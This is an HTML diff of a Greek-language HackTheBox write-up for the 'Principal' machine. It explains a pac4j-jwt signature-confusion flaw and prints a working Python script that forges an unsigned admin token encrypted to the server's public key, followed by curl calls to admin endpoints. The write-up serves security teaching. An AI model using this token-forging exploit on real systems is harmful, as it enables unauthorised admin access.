@@ -1,0 +1,652 @@
+<!DOCTYPE html>
+<html lang="el">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://cloudflareinsights.com; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>HTB: Principal — S. Markakis</title>
+<meta name="description" content="Ένα token pac4j-jwt που είναι κρυπτογραφημένο (JWE) αλλά του οποίου η εσωτερική υπογραφή δεν επαληθεύεται ποτέ (CVE-2026-29000) σου επιτρέπει να πλαστογραφήσεις μια συνεδρία ROLE_ADMIN· ένα admin API μετά διαρρέει έναν κωδικό SSH, και ένα ιδιωτικό κλειδί SSH CA αναγνώσιμο από το group σε αφήνει να υπογράψεις το δικό σου πιστοποιητικό root.">
+<meta property="og:title" content="HTB: Principal — S. Markakis">
+<meta property="og:description" content="Ένα token pac4j-jwt που είναι κρυπτογραφημένο (JWE) αλλά του οποίου η εσωτερική υπογραφή δεν επαληθεύεται ποτέ (CVE-2026-29000) σου επιτρέπει να πλαστογραφήσεις μια συνεδρία ROLE_ADMIN· ένα admin API μετά διαρρέει έναν κωδικό SSH, και ένα ιδιωτικό κλειδί SSH CA αναγνώσιμο από το group σε αφήνει να υπογράψεις το δικό σου πιστοποιητικό root.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://s-markakis.github.io/writeups/htb-principal-el.html">
+<meta property="og:image" content="https://s-markakis.github.io/writeups/assets/og/htb-principal.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s-markakis.github.io/writeups/assets/og/htb-principal.png">
+<link rel="canonical" href="https://s-markakis.github.io/writeups/htb-principal-el.html">
+
+<link rel="alternate" hreflang="en" href="https://s-markakis.github.io/writeups/htb-principal.html">
+<link rel="alternate" hreflang="el" href="https://s-markakis.github.io/writeups/htb-principal-el.html">
+<link rel="alternate" hreflang="x-default" href="https://s-markakis.github.io/writeups/htb-principal.html">
+
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@700;800&family=Barlow:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root {
+    --bg:        #eae8e3;
+    --bg-code:   #dddbd5;
+    --bg-term:   #d4d2cc;
+    --text:      #888880;
+    --text-dark: #1a1a18;
+    --text-mid:  #555550;
+    --border:    #c8c6c0;
+    --tag-bg:    #d8d6d0;
+    --tag-text:  #555550;
+    --accent:    #1a1a18;
+    --t-user:    #4a7c59;
+    --t-host:    #5a6e8a;
+    --t-path:    #7a6040;
+    --t-cmd:     #1a1a18;
+    --t-out:     #666660;
+    --t-yellow:  #8a7030;
+    --t-red:     #8a3030;
+    --t-green:   #3a6a48;
+    --t-comment: #aaa89f;
+    --t-blue:    #3a5a7a;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Barlow', sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 780px;
+    margin: 0 auto;
+    padding: 4rem 2rem 8rem;
+  }
+
+  .post-header { margin-bottom: 2.5rem; }
+
+  h1 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 3.2rem;
+    line-height: 1.05;
+    color: var(--text-dark);
+    letter-spacing: -.01em;
+    margin-bottom: 1rem;
+  }
+
+  .post-meta {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    flex-wrap: wrap;
+  }
+  .post-meta .date { color: var(--text); }
+
+  .tag {
+    background: var(--tag-bg);
+    color: var(--tag-text);
+    font-size: 0.72rem;
+    font-weight: 600;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    padding: .2rem .6rem;
+    border-radius: 3px;
+  }
+  .tag-htb  { background: #c8d8c0; color: #2a4a28; }
+  .tag-lin  { background: #d8d0c0; color: #4a3a20; }
+  .tag-win  { background: #c0d0e0; color: #1e3a5a; }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2rem 0;
+  }
+
+  .overview {
+    background: var(--bg-code);
+    border-left: 3px solid var(--text-dark);
+    padding: 1.2rem 1.5rem;
+    margin: 2rem 0;
+    font-size: 0.95rem;
+    line-height: 1.7;
+    color: var(--text-mid);
+  }
+
+  .chain {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: .4rem;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    padding: .9rem 1.2rem;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.74rem;
+    margin: 1.5rem 0 2.5rem;
+    color: var(--text-mid);
+  }
+  .chain-node {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text-dark);
+    padding: .2rem .7rem;
+    border-radius: 3px;
+    font-weight: 500;
+  }
+  .chain-arrow { color: var(--text); }
+
+  h2 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 1.9rem;
+    color: var(--text-dark);
+    margin: 3rem 0 .8rem;
+    letter-spacing: -.01em;
+  }
+
+  h3 {
+    font-family: 'Barlow', sans-serif;
+    font-weight: 600;
+    font-size: 1.1rem;
+    color: var(--text-dark);
+    margin: 2rem 0 .6rem;
+  }
+
+  p { color: var(--text); margin-bottom: 1rem; }
+
+  strong { color: var(--text-dark); font-weight: 600; }
+
+  a { color: var(--text-mid); }
+
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82em;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    color: var(--text-mid);
+    padding: .1em .4em;
+    border-radius: 3px;
+  }
+
+  .terminal {
+    background: var(--bg-term);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.4rem 0;
+    overflow: hidden;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.65;
+  }
+  .term-bar {
+    background: var(--bg-code);
+    border-bottom: 1px solid var(--border);
+    padding: .45rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: .4rem;
+  }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dr { background: #c07070; }
+  .dy { background: #b8a050; }
+  .dg { background: #60a070; }
+  .term-label {
+    margin-left: auto;
+    font-size: 0.7rem;
+    color: var(--text);
+    letter-spacing: .05em;
+  }
+  .term-body {
+    padding: 1rem 1.3rem;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  .pu  { color: var(--t-user);    font-weight: 700; }
+  .ph  { color: var(--t-host);    font-weight: 700; }
+  .pp  { color: var(--t-path); }
+  .ps  { color: var(--t-comment); }
+  .pd  { color: var(--text-mid); }
+  .pc  { color: var(--t-cmd);     font-weight: 500; }
+  .po  { color: var(--t-out); }
+  .py  { color: var(--t-yellow); }
+  .pr  { color: var(--t-red); }
+  .pg  { color: var(--t-green); }
+  .pb  { color: var(--t-blue); }
+  .pco { color: var(--t-comment); }
+
+  .alert {
+    padding: .9rem 1.2rem;
+    margin: 1.4rem 0;
+    border-left: 3px solid;
+    font-size: 0.92rem;
+    border-radius: 0 4px 4px 0;
+  }
+  .alert-info    { background: #d8dde8; border-color: var(--t-blue);  color: #2a3a5a; }
+  .alert-warn    { background: #e8e0c8; border-color: var(--t-yellow); color: #5a4010; }
+  .alert-success { background: #d0ddd0; border-color: var(--t-green); color: #1a3a20; }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.4rem 0;
+    font-size: 0.88rem;
+  }
+  th {
+    text-align: left;
+    padding: .55rem 1rem;
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 700;
+    font-size: 0.8rem;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    color: var(--text-mid);
+    border-bottom: 2px solid var(--border);
+    background: var(--bg-code);
+  }
+  td {
+    padding: .5rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+  }
+  tr:hover td { background: var(--bg-code); }
+
+  ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; }
+  li { color: var(--text); margin-bottom: .3rem; }
+
+  .st td:nth-child(1) { color: var(--text-dark); font-weight: 600; }
+  .st td:nth-child(2) { color: var(--text-mid); }
+
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 2rem 3rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.82rem;
+    color: var(--text);
+  }
+  footer a { color: var(--text-mid); text-decoration: none; }
+  footer a:hover { color: var(--text-dark); }
+
+  .back {
+    display: inline-flex;
+    align-items: center;
+    gap: .4rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    text-decoration: none;
+    margin-bottom: 2.5rem;
+    transition: color .15s;
+  }
+  .back:hover { color: var(--text-dark); }
+
+  .screenshot {
+    max-width: 100%;
+    height: auto;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.6rem auto;
+    display: block;
+  }
+  picture { display: block; }
+
+  @media (max-width: 600px) {
+    nav { padding: 1rem 1.2rem; }
+    .wrapper { padding: 2rem 1.2rem 5rem; }
+    h1 { font-size: 2.4rem; }
+  }
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --bg-code:#161616; --bg-term:#161616; --border:#2a2a2a;
+    --text:#959086; --text-dark:#f4f3ef; --text-mid:#d4d2cc;
+    --tag-bg:#1e1e1e; --tag-text:#999690; --accent:#f4f3ef;
+    --t-user:#6a9c79; --t-host:#7a8eaa; --t-path:#9a8060; --t-cmd:#f4f3ef;
+    --t-out:#a6a69c; --t-yellow:#aa9050; --t-red:#aa5050; --t-green:#5a8a68;
+    --t-comment:#7a7870; --t-blue:#5a7a9a;
+  }
+</style>
+<style>
+  .htb-cta{display:flex;gap:.6rem;flex-wrap:wrap;margin:1.5rem 0}
+  .htb-cta.top{margin-top:.4rem}
+  .htb-cta a{flex:1 1 220px;display:flex;align-items:center;gap:.75rem;padding:.75rem .9rem;background:var(--bg-code);border:1px solid var(--border);border-radius:8px;text-decoration:none;color:var(--text-dark);font-family:'Barlow',sans-serif;transition:transform .15s,border-color .15s,background .15s}
+  .htb-cta a:hover{transform:translateY(-2px);border-color:var(--text-dark);background:var(--bg-term)}
+  .htb-cta svg{width:20px;height:20px;flex:none;stroke:var(--text-dark);fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+  .htb-cta .l-t{display:block;font-family:'Barlow Condensed',sans-serif;font-weight:600;font-size:1.02rem;letter-spacing:.01em;line-height:1.15;color:var(--text-dark)}
+  .htb-cta .l-s{display:block;font-size:.72rem;color:var(--text-mid);line-height:1.25}
+  .htb-cta .l-x{margin-left:auto;color:var(--text-mid);font-size:.95rem}
+</style>
+<script id="sp1r4-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: Principal",
+  "description": "Ένα token pac4j-jwt που είναι κρυπτογραφημένο (JWE) αλλά του οποίου η εσωτερική υπογραφή δεν επαληθεύεται ποτέ (CVE-2026-29000) σου επιτρέπει να πλαστογραφήσεις μια συνεδρία ROLE_ADMIN· ένα admin API μετά διαρρέει έναν κωδικό SSH, και ένα ιδιωτικό κλειδί SSH CA αναγνώσιμο από το group σε αφήνει να υπογράψεις το δικό σου πιστοποιητικό root.",
+  "datePublished": "2026-09-29",
+  "dateModified": "2026-09-29",
+  "inLanguage": "el",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "url": "https://s-markakis.github.io/writeups/htb-principal-el.html",
+  "image": "https://s-markakis.github.io/writeups/assets/og/htb-principal.png",
+  "keywords": [
+    "hackthebox",
+    "linux"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://s-markakis.github.io/blog.html#htb-principal"
+  },
+  "timeRequired": "PT11M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Barlow',sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Πίσω στο blog</a>
+
+<div class="wrapper">
+
+  <a class="back" href="https://s-markakis.github.io/blog.html">← Πίσω στα posts</a>
+  <p style="font-size:.8rem;letter-spacing:.04em;color:var(--text-mid);margin-bottom:1.2rem;"><a href="htb-principal.html" style="font-weight:600;">English</a> &nbsp;·&nbsp; <strong style="color:var(--text-dark);">Ελληνικά</strong></p>
+
+  <div class="post-header">
+    <h1>HTB: Principal</h1>
+    <div class="post-meta">
+      <span class="date">29 Σεπτεμβρίου 2026</span>
+      <span class="tag tag-htb">HackTheBox</span>
+      <span class="tag tag-lin">Linux</span>
+      <span class="tag">JWE signature confusion</span>
+      <span class="tag">Μεσαιο</span>
+      <span>&nbsp;11 λεπτα αναγνωσης</span>
+    </div>
+  </div>
+
+  <div class="htb-cta top">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">Το προφίλ μου στο HTB &amp; περισσότερα boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Εργαλεία security &amp; automation ανοιχτού κώδικα</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+
+  <hr class="divider">
+
+  <div class="overview">
+    Το Principal είναι ένα box Linux που βάζει μπροστά σου μία μοναδική, τακτοποιημένη web εφαρμογή και θέτει ένα ακριβές ερώτημα: πώς επαληθεύει την εμπιστοσύνη. Η εφαρμογή είναι μια υπηρεσία Java χτισμένη πάνω στο framework ασφαλείας <strong>pac4j</strong>, και το token της συνεδρίας είναι ένα <strong>JWE</strong> — ένα <em>κρυπτογραφημένο</em> JWT. Αυτή η κρυπτογράφηση είναι πραγματική, και είναι παγίδα: κάνει το token αδιαφανές και μοιάζει με ασφάλεια, αλλά ο server ελέγχει μόνο ότι το token κρυπτογραφήθηκε προς το δημόσιο κλειδί του. Δεν ελέγχει ποτέ ότι το JWT <em>μέσα</em> ήταν όντως υπογεγραμμένο. Το <strong>CVE-2026-29000</strong> είναι ακριβώς αυτή η σύγχυση. Επειδή το κλειδί κρυπτογράφησης είναι δημόσιο — δημοσιεύεται κυριολεκτικά σε ένα endpoint JWKS ώστε οι clients να μπορούν να επαληθεύουν tokens — οποιοσδήποτε μπορεί να φτιάξει ένα ανυπόγραφο JWT <code>alg:none</code> που δηλώνει <code>ROLE_ADMIN</code>, να το κρυπτογραφήσει μόνος του, και να το επιστρέψει ως έγκυρη συνεδρία admin. Από το admin dashboard, ένα endpoint API διαρρέει έναν κωδικό SSH σε καθαρό κείμενο· από εκείνον τον χρήστη, η συμμετοχή σε ένα group <code>deployers</code> κάνει αναγνώσιμο το <strong>ιδιωτικό κλειδί της αρχής πιστοποίησης SSH (CA)</strong> της πλατφόρμας — και ένα ιδιωτικό κλειδί CA που εμπιστεύεται ο <code>sshd</code> είναι ένα μηχάνημα που θα εγγυηθεί για οποιαδήποτε ταυτότητα του ζητήσεις, μαζί και τον root.
+  </div>
+
+  <div class="chain">
+    <span class="chain-node">χωρίς αυθεντικοποίηση</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">pac4j JWE sig-confusion (CVE-2026-29000)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">πλαστό token ROLE_ADMIN</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">admin API διαρρέει κωδικό SSH</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">svc-deploy SSH</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">ανάγνωση του trusted SSH CA</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">υπογραφή πιστοποιητικού root</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">root</span>
+  </div>
+
+  <!-- ══ RECON ══ -->
+  <h2>Αναγνώριση</h2>
+
+  <p>Δύο θύρες: SSH στην 22 και μια web εφαρμογή στην 8080. Ο web server είναι ο Jetty, και διαφημίζει το ακριβώς σημαντικό πράγμα κατευθείαν από ένα header απόκρισης — το framework αυθεντικοποίησης και την έκδοσή του:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">το header που κατονομάζει τον στόχο</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">curl -sI http://&lt;target&gt;:8080/</span>
+<span class="po">HTTP/1.1 302 Found
+Server: Jetty
+</span><span class="py">X-Powered-By: pac4j-jwt/6.0.3</span><span class="po">
+Location: /login</span></div>
+  </div>
+
+  <p>Το <strong>pac4j-jwt 6.0.3</strong> είναι μια συγκεκριμένη, τρέχουσα και ευάλωτη έκδοση. Η σελίδα login φορτώνει ένα μόνο script, το <code>/static/js/app.js</code>, και εκείνο το αρχείο είναι ασυνήθιστα γενναιόδωρο — τεκμηριώνει ολόκληρο τον σχεδιασμό του token σε ένα σχόλιο-κεφαλίδα, προφανώς επειδή οι ίδιες σταθερές του schema πρέπει να ταιριάζουν με τον server:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">app.js — ο σχεδιασμός του token, στο πιάτο</span></div>
+    <div class="term-body"><span class="pco"> * Token handling:
+ * - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
+ * - Public key available at /api/auth/jwks for token verification
+ * - Inner JWT is signed with RS256
+ *
+ * JWT claims schema:
+ *   sub   - username
+ *   role  - one of: ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
+ *   iss   - "principal-platform"
+ *   iat   - issued at (epoch)
+ *   exp   - expiration (epoch)</span>
+
+<span class="pco">// το token αποθηκεύεται στο sessionStorage και στέλνεται ως Bearer header·</span>
+<span class="pco">// τα /api/users και /api/settings περιορίζονται σε ROLE_ADMIN στην πλευρά του client</span></div>
+  </div>
+
+  <p>Άρα το token είναι ένα αντικείμενο δύο επιπέδων: ένα εσωτερικό JWT (claims + μια υπογραφή RS256) τυλιγμένο μέσα σε έναν φάκελο JWE (RSA-OAEP-256 key wrapping, A128GCM content encryption). Το δημόσιο κλειδί που χρειάζεται και για την «επαλήθευση» του token και — κρίσιμα — για την <em>κρυπτογράφηση</em> ενός νέου, σερβίρεται, χωρίς αυθεντικοποίηση, στο <code>/api/auth/jwks</code>:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">/api/auth/jwks — το δημόσιο κλειδί κρυπτογράφησης</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">curl -s http://&lt;target&gt;:8080/api/auth/jwks</span>
+<span class="po">{"keys":[{"kty":"RSA","e":"AQAB","kid":"enc-key-1","n":"lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5NpZX-WtBsdWtJRaeeG61i…"}]}</span></div>
+  </div>
+
+  <!-- ══ FOOTHOLD ══ -->
+  <h2>Foothold — η κρυπτογράφηση δεν είναι αυθεντικοποίηση (CVE-2026-29000)</h2>
+
+  <p>Ιδού το ελάττωμα, ξεκάθαρα. Ένα JWE αποδεικνύει ένα πράγμα: ότι όποιος έφτιαξε το token είχε το <em>δημόσιο</em> κλειδί του παραλήπτη. Αυτό δεν είναι μυστικό — είναι δημοσιευμένο. Η κρυπτογράφηση ενός JWT σου δίνει εμπιστευτικότητα (κανείς δεν διαβάζει τα claims εν κινήσει), αλλά δεν λέει τίποτα για το <em>ποιος</em> εξέδωσε τα claims. Η αυθεντικότητα είναι δουλειά της <strong>υπογραφής</strong> του εσωτερικού JWT, η οποία πρέπει να επαληθεύεται με το κλειδί του εκδότη.</p>
+
+  <p>Το <strong>CVE-2026-29000</strong> είναι το ότι ο authenticator JWE του pac4j, σε αυτή τη διαμόρφωση, αποκρυπτογραφεί τον εξωτερικό φάκελο και μετά εμπιστεύεται τα claims του εσωτερικού JWT <em>χωρίς να επαληθεύσει την υπογραφή του</em>. Αυτό καταρρέει ολόκληρο τον σχεδιασμό: αφού το κλειδί κρυπτογράφησης είναι δημόσιο, ένας επιτιθέμενος μπορεί να κατασκευάσει το δικό του token από άκρη σε άκρη. Φτιάχνεις ένα εσωτερικό JWT με <code>"alg":"none"</code> και άδεια υπογραφή, θέτεις το <code>role</code> σε <code>ROLE_ADMIN</code>, και μετά το κρυπτογραφείς προς το ίδιο το κλειδί JWKS του server. Ο server το αποκρυπτογραφεί, βλέπει ένα καλοσχηματισμένο JWT που μπορεί να διαβάσει, και ποτέ δεν ρωτά αν ήταν υπογεγραμμένο.</p>
+
+  <p>Συγκεκριμένα, με τους όρους του ίδιου του pac4j: ο <code>JwtAuthenticator</code> υποστηρίζει <strong>nested tokens</strong> — ένα εσωτερικό, RS256-υπογεγραμμένο JWT τυλιγμένο μέσα σε ένα εξωτερικό JWE — και δέχεται ένα <code>EncryptionConfiguration</code> και ένα <code>SignatureConfiguration</code> ως <em>ανεξάρτητες</em> επιλογές. Το Principal ρύθμισε την κρυπτογράφηση αλλά ποτέ δεν επέβαλε την υπογραφή, οπότε μόλις αποκρυπτογραφηθεί το εξωτερικό JWE, ένα εσωτερικό <code>PlainJWT</code> (ένα ανυπόγραφο token) γίνεται δεκτό ως επικυρωμένο. Το <code>kid</code> στο JWKS είναι μάλιστα ονομασμένο <code>enc-key-1</code> — ο server δημοσιεύει το <em>κλειδί κρυπτογράφησής</em> του εκεί που ένας verifier θα δημοσίευε κανονικά ένα <em>κλειδί υπογραφής</em>, που είναι όλο το tell σε ένα string.</p>
+
+  <figure style="margin:1.8rem 0;">
+    <svg viewBox="0 0 720 210" width="100%" role="img" aria-label="Διάγραμμα: ένας φάκελος JWE τυλίγει ένα εσωτερικό JWT του οποίου το τμήμα υπογραφής δεν επαληθεύεται ποτέ" style="font-family:'JetBrains Mono',monospace;">
+      <rect x="8" y="34" width="704" height="150" rx="8" fill="var(--bg-code)" stroke="var(--text-dark)" stroke-width="1.5"/>
+      <text x="24" y="24" fill="var(--text-mid)" font-size="13" font-weight="600">φάκελος JWE · RSA-OAEP-256 (key wrap) + A128GCM (encrypt)</text>
+      <text x="700" y="24" text-anchor="end" fill="var(--t-green)" font-size="13" font-weight="700">ο server ελέγχει αυτό ✓</text>
+      <rect x="30" y="86" width="660" height="76" rx="6" fill="var(--bg)" stroke="var(--border)" stroke-width="1"/>
+      <text x="46" y="76" fill="var(--text-mid)" font-size="12">εσωτερικό JWT — αυτό που όντως εμπιστεύεται ο server</text>
+      <line x1="250" y1="86" x2="250" y2="162" stroke="var(--border)" stroke-width="1"/>
+      <line x1="480" y1="86" x2="480" y2="162" stroke="var(--border)" stroke-width="1"/>
+      <text x="60" y="120" fill="var(--text-dark)" font-size="13" font-weight="600">header</text>
+      <text x="60" y="142" fill="var(--text-mid)" font-size="12">alg: none</text>
+      <text x="268" y="120" fill="var(--text-dark)" font-size="13" font-weight="600">payload</text>
+      <text x="268" y="142" fill="var(--text-mid)" font-size="12">role: ROLE_ADMIN</text>
+      <text x="498" y="120" fill="var(--t-red)" font-size="13" font-weight="600" text-decoration="line-through">signature</text>
+      <text x="498" y="142" fill="var(--t-red)" font-size="12">✗ ποτέ δεν επαληθεύεται</text>
+    </svg>
+    <figcaption style="font-size:.8rem;color:var(--text-mid);text-align:center;margin-top:.5rem;">Ο server επικυρώνει την εξωτερική κρυπτογράφηση και σταματά εκεί. Η εσωτερική υπογραφή — το μόνο πράγμα που αποδεικνύει <em>ποιος</em> εξέδωσε τα claims — δεν ελέγχεται ποτέ, οπότε ένας επιτιθέμενος που κατέχει το δημόσιο κλειδί κατέχει το token.</figcaption>
+  </figure>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">forge.py — ανυπόγραφο εσωτερικό JWT, τυλιγμένο σε JWE προς το δημόσιο κλειδί</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">cat forge.py</span>
+<span class="po">import json, time, base64, urllib.request
+from jwcrypto import jwk, jwe
+
+T = "http://&lt;target&gt;:8080"
+b64u = lambda b: base64.urlsafe_b64encode(b).rstrip(b'=').decode()
+
+</span><span class="pco"># 1. τράβα το δημόσιο κλειδί κρυπτογράφησης κατευθείαν από το JWKS</span><span class="po">
+jwks = json.load(urllib.request.urlopen(T + "/api/auth/jwks"))
+key  = jwk.JWK(**jwks["keys"][0])
+
+</span><span class="pco"># 2. φτιάξε ένα ΑΝΥΠΟΓΡΑΦΟ εσωτερικό JWT (alg:none, άδεια υπογραφή)</span><span class="po">
+now = int(time.time())
+hdr = {"alg": "none", "typ": "JWT"}
+pl  = {"sub": "admin", "role": "ROLE_ADMIN", "iss": "principal-platform",
+       "iat": now, "exp": now + 3600}
+inner = b64u(json.dumps(hdr).encode()) + "." + b64u(json.dumps(pl).encode()) + "."
+
+</span><span class="pco"># 3. τύλιξέ το σε JWE προς το κλειδί του ίδιου του server — RSA-OAEP-256 + A128GCM</span><span class="po">
+prot = {"alg": "RSA-OAEP-256", "enc": "A128GCM", "kid": "enc-key-1"}
+tok  = jwe.JWE(inner.encode(), recipient=key, protected=json.dumps(prot))
+print(tok.serialize(compact=True))</span></div>
+  </div>
+
+  <div class="alert alert-info"><strong>Γιατί δουλεύει εδώ το <code>alg:none</code>:</strong> ο server δεν εκτελεί ποτέ τον έλεγχο υπογραφής, οπότε δεν έχει σημασία τι δηλώνει το εσωτερικό header. Το <code>none</code> είναι απλώς η ελάχιστη προσπάθεια — χωρίς κλειδί, χωρίς βήμα υπογραφής — και περνάει άθικτο επειδή η επαλήθευση που θα το απέρριπτε παραλείφθηκε τελείως. Το δημόσιο κλειδί κάνει όλη τη βαριά δουλειά στην πλευρά της κρυπτογράφησης, που είναι η μόνη πλευρά που ο server πραγματικά επικυρώνει.</div>
+
+  <p>Παρουσίασε το πλαστό token ως bearer credential και το admin API ανοίγει. Το <code>/api/dashboard</code> επιβεβαιώνει την ταυτότητα που ο server συμπέρανε από το token μας — <code>admin</code> / <code>ROLE_ADMIN</code> — και το <code>/api/settings</code> είναι εκεί που το box παραδίδει το επόμενο βήμα:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">πλαστό admin token → το admin API</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">TOKEN=$(python3 forge.py)</span>
+<span class="pd">$ </span><span class="pc">curl -s -H "Authorization: Bearer $TOKEN" http://&lt;target&gt;:8080/api/dashboard | jq .user</span>
+<span class="pg">{ "username": "admin", "role": "ROLE_ADMIN" }</span>
+<span class="pd">$ </span><span class="pc">curl -s -H "Authorization: Bearer $TOKEN" http://&lt;target&gt;:8080/api/settings | jq .security</span>
+<span class="po">{
+  "authFramework": "pac4j-jwt", "authFrameworkVersion": "6.0.3",
+  "jwtAlgorithm": "RS256", "jweAlgorithm": "RSA-OAEP-256", "jweEncryption": "A128GCM",
+  </span><span class="py">"encryptionKey": "&lt;λογοκριμένο — ένα μυστικό deploy σε καθαρό κείμενο&gt;"</span><span class="po">,
+  "tokenExpiry": "3600s"
+}</span></div>
+  </div>
+
